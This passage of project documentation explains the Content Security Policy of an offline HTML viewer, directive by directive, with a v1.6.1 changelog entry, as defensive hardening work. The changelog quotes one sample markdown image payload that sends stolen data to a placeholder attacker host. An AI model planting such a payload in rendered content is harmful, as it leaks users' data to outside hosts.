...
tag (see `viewer.html` line 20, just after the long comment block).
It is tight by default and relaxed only where a documented runtime need
exists. The current (v1.6.1) directives:

| Directive | Value | Why |
|---|---|---|
| `default-src` | `'self'` | Baseline. Every other directive is tighter or an explicit exception. |
| `script-src` | `'self' https://cdn.jsdelivr.net 'unsafe-inline'` | CDN for the pinned + SRI-hashed vendor bundles; `'self'` for `./vendor/` fallback; `'unsafe-inline'` for the failure-registry bootstrap and per-script `onerror` handlers. |
| `style-src` | `'self' https://cdn.jsdelivr.net 'unsafe-inline'` | Same rationale; `'unsafe-inline'` covers inline `<style>` blocks. |
| `img-src` | `'self' data: https://cdn.jsdelivr.net` | v1.6.1 tightened: dropped bare `https:` wildcard (previously a wide-open exfil channel). `data:` kept for Mermaid SVG embeds. |
| `connect-src` | `'self' https://cdn.jsdelivr.net/npm/` | v1.6.1 relaxed from `'none'`. The viewer has **zero runtime fetch/XHR/WebSocket**; the only network traffic on this directive is **DevTools source-map prefetches** for the minified bundles. `'self'` covers `./vendor/*.min.js.map` (vendor-fallback mode); the `/npm/` path-prefix covers `*.min.js.map` for live-CDN mode while blocking the jsDelivr `/gh/*` proxy (which would otherwise be a path-logging exfil vector). **Why allow this at all?** Before v1.6.1, every developer who opened DevTools on the viewer saw a wall of red "Refused to connect ... Content Security Policy" errors as the browser tried to fetch source maps and was blocked. Those source-map fetches are read-only debugging traffic — they never carry document data into the request URL or body — so allowing the narrow path is correct. **Safety invariant**: this allowlist is safe only because every CDN `<script>` carries SRI (`integrity=`), which locks the `//# sourceMappingURL=` footer bytes against attacker-controlled redirection. If you ever add an unhashed CDN script tag, audit this directive. |
| `object-src` | `'none'` | No `<object>`/`<embed>`/`<applet>`. |
| `frame-src` | `'none'` | No iframes. |
| `child-src` | `'none'` | CSP2 fallback for browsers that don't honor `worker-src`/`frame-src` independently. |
| `worker-src` | `'none'` | Explicit lock — flip to `'self'` the day a vendored library needs a Web Worker. |
| `base-uri` | `'self'` | Blocks `<base href=...>` hijacking of relative URLs (e.g., poisoning `./vendor/`). |
| `form-action` | `'none'` | No `<form>` submissions exist anywhere in the viewer. Closes a class of injection-driven exfiltration that `connect-src` does not cover. |
| `manifest-src` | `'none'` | No PWA manifest; explicit lock prevents an accidental future `<link rel="manifest">` from loading without review. |
| `upgrade-insecure-requests` | (present) | No-op on `file://` and on `http://`; useful only when the viewer is served over `https://`. Kept as zero-cost portable insurance. |

**Honest framing.** With `'unsafe-inline'` present on `script-src`,
this CSP cannot stop inline `<script>` injection. The primary anti-XSS
layer is **DOMPurify** (`FORBID_TAGS` / `FORBID_ATTR` lists + the
`afterSanitizeAttributes` hook in `viewer.html` that strips
`javascript:`/`vbscript:` schemes from `href`/`src` and rejects `data:`
on non-`<img>`/`<source>` tags). The CSP layer here is a backstop for
**external resource loading** and `object`/`base` hijacks. Future
hardening: move the inline bootstrap + onerror handlers to
`./bootstrap.js` and drop `'unsafe-inline'` from `script-src`.

**`frame-ancestors` is deliberately absent from the meta tag.** The
CSP spec says `frame-ancestors` is ignored when delivered via
`<meta http-equiv>`, and Chromium emits a console error if it sees
one there — which would directly contradict the v1.6.1 clean-console
goal. Real clickjacking protection must come from an HTTP response
header at the hosting layer: either `X-Frame-Options: DENY` or a
`Content-Security-Policy: frame-ancestors 'none'` header.

**Report-only mode for dependency bumps.** Major-version bumps of
ExcelJS, JSZip, html-docx-js, marked, DOMPurify, or highlight.js
should be smoke-tested by temporarily switching the meta tag's
`http-equiv` to `Content-Security-Policy-Report-Only` in a local
build, exercising every feature (CSV / XLSX / DOCX export, syntax
highlighting, Mermaid render), and confirming zero violations before
re-enabling enforcing mode. A persistent `report-uri` endpoint is
**not** added because the viewer must run from `file://` and offline,
and a reporting URL would either silently fail or leak telemetry —
contradicting the no-exfil design intent.
...
| Version | Date | Notes |
|---------|------|-------|
| 1.6.1 | 2026-06-01 | **CSP fix — clean DevTools console** for the live-CDN path. Before v1.6.1, opening DevTools on the viewer surfaced a wall of red "Refused to connect ... Content Security Policy directive: connect-src 'none'" errors because the browser tries to prefetch source maps for every minified `<script src="cdn.jsdelivr.net/...">` and the previous `connect-src 'none'` blocked all of them. Fix: relax `connect-src` from `'none'` to `'self' https://cdn.jsdelivr.net/npm/`. The `'self'` token covers the offline `./vendor/*.min.js.map` fallback path (otherwise the same source-map errors would reproduce in vendor-fallback mode); the `/npm/` path-prefix admits the live-CDN `*.min.js.map` files while **blocking the jsDelivr `/gh/*` proxy** — closing a URL-path-logging exfil vector at the CDN edge that a bare `cdn.jsdelivr.net` allowance would have left open. Critical+high adversarial fixes folded in: (1) **`img-src` tightened** — dropped the bare `https:` wildcard that was a wide-open data-exfiltration channel (`![](https://attacker/?d=stolen)` would have fired with the query string carrying the payload); new value is `'self' data: https://cdn.jsdelivr.net`. (2) **`connect-src` pinned to `/npm/` path** rather than the bare CDN host, as documented above. (3) **`form-action 'none'`** added — no `<form>` submissions exist, this closes a class of injection-driven exfiltration that `connect-src` does not cover. (4) **`child-src`, `worker-src`, `manifest-src` all `'none'`** added as explicit locks (currently no workers/iframes/manifest; flip to `'self'` the day a vendored library needs one — better than relying on the `default-src 'self'` fallback). (5) **`upgrade-insecure-requests`** added as zero-cost portable insurance for HTTPS-served deployments (no-op on `file://` and `http://`). (6) **`frame-ancestors` deliberately omitted from the meta tag** — Chromium emits a console error when it sees `frame-ancestors` in `<meta>` (ignored at meta-tag layer per CSP spec), which would defeat the v1.6.1 clean-console goal. Real clickjacking protection must come from an `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` HTTP response header at the hosting layer. (7) **Comment block above the meta tag fully rewritten** to document every directive choice, the safety invariant (`connect-src/npm/` allowance is safe only because every CDN `<script>` has SRI, which locks the `//# sourceMappingURL=` footer bytes), the cross-browser caveats (Chromium historically exempted DevTools source-map fetches from page CSP; Firefox and Safari 15+ enforce — this fix addresses the worst case), and the report-only-mode rollout guidance for future dependency bumps. (8) **Honest framing documented**: with `'unsafe-inline'` on `script-src`, CSP cannot stop inline `<script>` injection — DOMPurify remains the primary anti-XSS layer; CSP is a backstop for external resource loading and `object`/`base` hijacks. Playwright Scenario 10 adds 18 assertions covering live-CDN load with full console capture (zero `console.error`, zero `pageerror`, zero CSP / `connect-src` / "Refused to connect" mentions in any error or warning), CDP `Audits.issueAdded` channel attachment confirming zero `ContentSecurityPolicyIssue` emissions, plus structural assertions on the meta tag itself (`connect-src 'self' https://cdn.jsdelivr.net/npm/` present, old `connect-src 'none'` gone, bare `https:` wildcard absent from `img-src`, `form-action 'none'` present, `upgrade-insecure-requests` present, `frame-ancestors` absent from the meta tag). Screenshot `10_console_clean.png` captures the post-fix viewer state. No runtime behavior changes outside the CSP directive set. |
